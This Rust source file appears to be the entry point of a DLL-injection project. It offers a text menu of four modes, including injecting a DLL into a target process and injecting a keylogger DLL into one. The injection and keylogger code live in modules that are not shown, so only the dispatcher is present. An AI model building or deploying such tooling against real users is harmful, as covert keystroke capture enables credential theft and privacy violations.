use std::io;
use std::str::FromStr;
mod dll;
mod programs;

#[derive(Debug)]
enum ProgramMode {
    LoadDllMainInCurrentProcess,
    CallDllExportedFunctionInCurrentProcess,
    InjectDllToTargetProcess,
    InjecKeyLoggerDllToTargetProcess,
}
pub const PROGRAM1: &str = "Load_Dll_Main_In_Current_Process";
pub const PROGRAM2: &str = "Call_Dll_Exported_Function_In_Current_Process";
pub const PROGRAM3: &str = "Inject_Dll_To_Target_Process";
pub const PROGRAM4: &str = "Inject_Key_Logger_Dll_To_Target_Process";
pub const PROGRAMS: [&str; 4] = [PROGRAM1, PROGRAM2, PROGRAM3, PROGRAM4];

fn main() {
    println!("Please enter program mode ({}): ", PROGRAMS.join(", "));

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();

    match input.trim().parse::<ProgramMode>() {
        Ok(mode) => {
            println!("You selected: {:?}", mode);
            match mode {
                ProgramMode::LoadDllMainInCurrentProcess => {
                    programs::load_dll_in_current_process::call_dll_main();
                }
                ProgramMode::CallDllExportedFunctionInCurrentProcess => {
                    programs::load_dll_in_current_process::call_dll_exported_function()
                }
                ProgramMode::InjectDllToTargetProcess => {
                    programs::inject_to_process::inject_dll(dll::dll_utils::DLL_PATH)
                }
                ProgramMode::InjecKeyLoggerDllToTargetProcess => {
                    programs::inject_to_process::inject_dll(dll::dll_utils::KEY_LOGGER_DLL_PATH)
                }
            }
        }
        Err(_) => println!("Invalid input, program not exist."),
    }
}

impl FromStr for ProgramMode {
    type Err = ();

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.trim() {
            PROGRAM1 => Ok(ProgramMode::LoadDllMainInCurrentProcess),
            PROGRAM2 => Ok(ProgramMode::CallDllExportedFunctionInCurrentProcess),
            PROGRAM3 => Ok(ProgramMode::InjectDllToTargetProcess),
            PROGRAM4 => Ok(ProgramMode::InjecKeyLoggerDllToTargetProcess),
            _ => Err(()),
        }
    }
}
